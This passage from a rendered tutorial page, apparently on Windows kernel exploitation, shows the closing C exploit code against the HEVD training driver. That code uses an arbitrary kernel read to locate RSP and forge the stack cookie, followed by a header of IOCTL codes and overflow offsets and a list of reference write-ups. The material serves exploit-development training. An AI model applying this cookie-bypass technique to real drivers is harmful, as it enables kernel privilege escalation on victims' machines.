+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">CalculateFinalStackCookie</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDriver</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">originalCookie</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">stackLimit</span><span class="p">,</span> <span class="n">ULONG64</span><span class="o">*</span> <span class="n">outRSP</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">ctlCodeAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">currentAddress</span> <span class="o">=</span> <span class="n">stackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">leakedValue</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[*] Searching IOCTL (0x22200B) value...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mh">0x7000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">BOOL</span> <span class="n">readOk</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">leakedValue</span> <span class="o">=</span> <span class="nf">ArbitraryRead64</span><span class="p">(</span><span class="n">hDriver</span><span class="p">,</span> <span class="n">currentAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readOk</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">readOk</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Error while calling ArbitraryRead64</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">leakedValue</span> <span class="o">==</span> <span class="n">HEVD_IOCTL_ARBITRARY_WRITE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ctlCodeAddress</span> <span class="o">=</span> <span class="n">currentAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] IOCTL found @ 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ctlCodeAddress</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">currentAddress</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ctlCodeAddress</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[-] IOCTL doesn&#39;t found in the stack</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">predictedRSP</span> <span class="o">=</span> <span class="n">ctlCodeAddress</span> <span class="o">-</span> <span class="n">RSP_OFFSET</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\t</span><span class="s">[+] RSP value: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">predictedRSP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG64</span> <span class="n">finalCookie</span> <span class="o">=</span> <span class="n">originalCookie</span> <span class="o">^</span> <span class="n">predictedRSP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Final cookie: 0x%llX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">finalCookie</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">outRSP</span> <span class="o">=</span> <span class="n">predictedRSP</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">finalCookie</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>Header file:</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#pragma once
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define HEVD_IOCTL_ARBITRARY_WRITE								 IOCTL(0x802)
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define SECURITY_COOKIE_OFFSET 0x3000
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define RSP_OFFSET             0x2a8
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#define BUFFER_SIZE 0x200
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define CANARY_SIZE 0x8
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define OFFSET_RDI 0x20
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define OFFSET_RSI 0x28
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define PADDING_SIZE 0x8 * 6
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define INITIAL_PADDING 0x40
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#pragma comment(lib, &#34;ntdll.lib&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define SystemProcessInformation 5
+</span></span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_EXTENDED_THREAD_INFORMATION</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYSTEM_THREAD_INFORMATION</span> <span class="n">ThreadInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">StackBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">StackLimit</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Win32StartAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">TebBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">Reserved2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">Reserved3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG_PTR</span> <span class="n">Reserved4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_EXTENDED_THREAD_INFORMATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_EXTENDED_THREAD_INFORMATION</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_SYSTEM_EXTENDED_PROCESS_INFORMATION</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYSTEM_PROCESS_INFORMATION</span> <span class="n">ProcessInfo</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYSTEM_EXTENDED_THREAD_INFORMATION</span> <span class="n">Threads</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_EXTENDED_PROCESS_INFORMATION</span><span class="p">,</span> <span class="o">*</span> <span class="n">PSYSTEM_EXTENDED_PROCESS_INFORMATION</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ULONGLONG</span> <span class="nf">getBaseAddr</span><span class="p">(</span><span class="n">LPCWSTR</span> <span class="n">drvName</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">CalculateFinalStackCookie</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDriver</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">originalCookie</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">stackLimit</span><span class="p">,</span> <span class="n">ULONG64</span><span class="o">*</span> <span class="n">preditectRSP</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">ArbitraryRead64</span><span class="p">(</span><span class="n">HANDLE</span> <span class="n">hDriver</span><span class="p">,</span> <span class="n">ULONG64</span> <span class="n">kernelAddress</span><span class="p">,</span> <span class="n">BOOL</span><span class="o">*</span> <span class="n">success</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">ULONG64</span> <span class="nf">GetStackLimit</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">getSecurityCookie</span><span class="p">(</span><span class="n">ULONG64</span> <span class="n">baseAddr</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityValue</span><span class="p">,</span> <span class="n">PULONG64</span> <span class="n">securityAddr</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">_WRITE_WHAT_WHERE</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">What</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PULONG_PTR</span> <span class="n">Where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">WRITE_WHAT_WHERE</span><span class="p">,</span> <span class="o">*</span> <span class="n">PWRITE_WHAT_WHERE</span><span class="p">;</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h3>Resources<span class="hx-absolute -hx-mt-20" id="resources"></span>
+    <a href="#resources" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><ul>
+<li><a href="https://flysand7.hashnode.dev/how-security-cookie-works" target="_blank" rel="noopener">https://flysand7.hashnode.dev/how-security-cookie-works</a></li>
+<li><a href="https://www.fox-it.com/be-en/defeating-windows-dep-with-a-custom-rop-chain/" target="_blank" rel="noopener">https://www.fox-it.com/be-en/defeating-windows-dep-with-a-custom-rop-chain/</a></li>
+<li><a href="https://hackingiscool.pl/hevd-stackgs-x86-win7/" target="_blank" rel="noopener">https://hackingiscool.pl/hevd-stackgs-x86-win7/</a></li>
+<li><a href="https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/" target="_blank" rel="noopener">https://vuln.dev/windows-kernel-exploitation-hevd-x64-stackoverflow/</a></li>
+<li><a href="https://github.com/r0r0x-xx/OSED-Pre" target="_blank" rel="noopener">https://github.com/r0r0x-xx/OSED-Pre</a></li>
+<li><a href="https://medium.com/@sushant.m.mane/hevd-windows-kernel-exploitation-stack-overflow-12be551350f1" target="_blank" rel="noopener">https://medium.com/@sushant.m.mane/hevd-windows-kernel-exploitation-stack-overflow-12be551350f1</a></li>
+<li><a href="https://writeups.io/summaries/technical-analysis-of-exploit-development-for-hevd-driver-stack-overflow-x64-by-hector-marco-ismael-ripoll/" target="_blank" rel="noopener">https://writeups.io/summaries/technical-analysis-of-exploit-development-for-hevd-driver-stack-overflow-x64-by-hector-marco-ismael-ripoll/</a></li>
+</ul>
+
+        </div><div class="hx-mt-16"></div><div class="hx-mb-8 hx-flex hx-items-center hx-border-t hx-pt-8 dark:hx-border-neutral-800 contrast-more:hx-border-neutral-400 dark:contrast-more:hx-border-neutral-400 print:hx-hidden"><a
+        href="/winint-compilation/winint-useafterfree/"
+        title="Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)"
+        class="hx-flex hx-max-w-[50%] hx-items-center hx-gap-1 hx-py-4 hx-text-base hx-font-medium hx-text-gray-600 hx-transition-colors [word-break:break-word] hover:hx-text-primary-600 dark:hx-text-gray-300 md:hx-text-lg ltr:hx-ml-auto ltr:hx-pl-4 ltr:hx-text-right rtl:hx-mr-auto rtl:hx-pr-4 rtl:hx-text-left"
+      >Use-After-Free - HEVD (&#43; SMEP/KASLR/KPP Bypass)<svg class="hx-inline hx-h-5 hx-shrink-0 rtl:-hx-rotate-180" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M9 5l7 7-7 7"/></svg></a></div></main>
+    </article>
+  </div>
+
+      <footer class="hextra-footer hx-bg-gray-100 hx-pb-[env(safe-area-inset-bottom)] dark:hx-bg-neutral-900 print:hx-bg-transparent"><div class="hx-mx-auto hx-flex hx-gap-2 hx-py-2 hx-px-4 hx-max-w-screen-xl"><button
+  title="Change theme"
+  data-theme="light"
+  class="theme-toggle hx-group hx-h-7 hx-rounded-md hx-px-2 hx-text-left hx-text-xs hx-font-medium hx-text-gray-600 hx-transition-colors dark:hx-text-gray-400 hover:hx-bg-gray-100 hover:hx-text-gray-900 dark:hover:hx-bg-primary-100/5 dark:hover:hx-text-gray-50"
+  type="button"
+  aria-label="Change theme"
+>
+  <div class="hx-flex hx-items-center hx-gap-2 hx-capitalize"><svg height=12 class="group-data-[theme=light]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><span class="group-data-[theme=light]:hx-hidden">Light</span><svg height=12 class="group-data-[theme=dark]:hx-hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><span class="group-data-[theme=dark]:hx-hidden">Dark</span></div>
+</button>
+</div><hr class="dark:hx-border-neutral-800" /><div
+      class="hextra-custom-footer hx-max-w-screen-xl hx-pl-[max(env(safe-area-inset-left),1.5rem)] hx-pr-[max(env(safe-area-inset-right),1.5rem)] hx-text-gray-600 dark:hx-text-gray-400"
+    ></div></footer>
+    
+    <script defer src="/js/main.min.0942239592f0795dc7213dd1057fd229d7edc19c0ef1a285396eb292d9ca9842.js" integrity="sha256-CUIjlZLweV3HIT3RBX/SKdftwZwO8aKFOW6yktnKmEI="></script>
+<script defer src="/lib/flexsearch/flexsearch.bundle.min.0425860527cc9968f9f049421c7a56b39327d475e2e3a8f550416be3a9134327.js" integrity="sha256-BCWGBSfMmWj58ElCHHpWs5Mn1HXi46j1UEFr46kTQyc="></script>
+    <script defer src="/en.search.min.7918d81999396a56d9ff1b7a986d6474e66bd5acdbbe01e8bac129f5ef345a88.js" integrity="sha256-eRjYGZk5albZ/xt6mG1kdOZr1azbvgHousEp9e80Wog="></script><link type="text/css" rel="stylesheet" href="/lib/katex/katex.min.7e5db7914b97e596a36c1abb67ccc7f174f8bb71d38c9a88c55b262ed1737f97.css" integrity="sha256-fl23kUuX5ZajbBq7Z8zH8XT4u3HTjJqIxVsmLtFzf5c=" />
+<script defer src="/lib/katex/katex.min.9f45307c5794ed247a0d095f3a62e52ef2215a67b2327203a7fd919959ae79d1.js" integrity="sha256-n0UwfFeU7SR6DQlfOmLlLvIhWmeyMnIDp/2RmVmuedE="></script>
+<script defer src="/lib/katex/auto-render.min.7b57d427ac6270677daf8d8380ded2cc73336f9149a167b8e1fe0d6ef66604ae.js" integrity="sha256-e1fUJ6xicGd9r42DgN7SzHMzb5FJoWe44f4NbvZmBK4="></script>
+<script defer src="/lib/katex/mhchem.min.f0ca03df194b8c3d6017ff455db6a0ef98857905663fa311a6cded788b15340b.js" integrity="sha256-8MoD3xlLjD1gF/9FXbag75iFeQVmP6MRps3teIsVNAs="></script>
+<script>
+  
+  
+  document.addEventListener("DOMContentLoaded", function () {
+    renderMathInElement(document.body, {
+      delimiters: [
+        { left: "$$", right: "$$", display: true },
+        { left: "$", right: "$", display: false },
+        { left: "\\(", right: "\\)", display: false },
+        { left: "\\begin{equation}", right: "\\end{equation}", display: true },
+        {left: "\\begin{align}", right: "\\end{align}", display: true},
+        {left: "\\begin{alignat}", right: "\\end{alignat}", display: true},
+        {left: "\\begin{gather}", right: "\\end{gather}", display: true},
+        {left: "\\begin{CD}", right: "\\end{CD}", display: true},
+        { left: "\\[", right: "\\]", display: true },
+      ],
+      throwOnError: false,
+    });
+  });
+</script>
+
+  </body>
+</html>
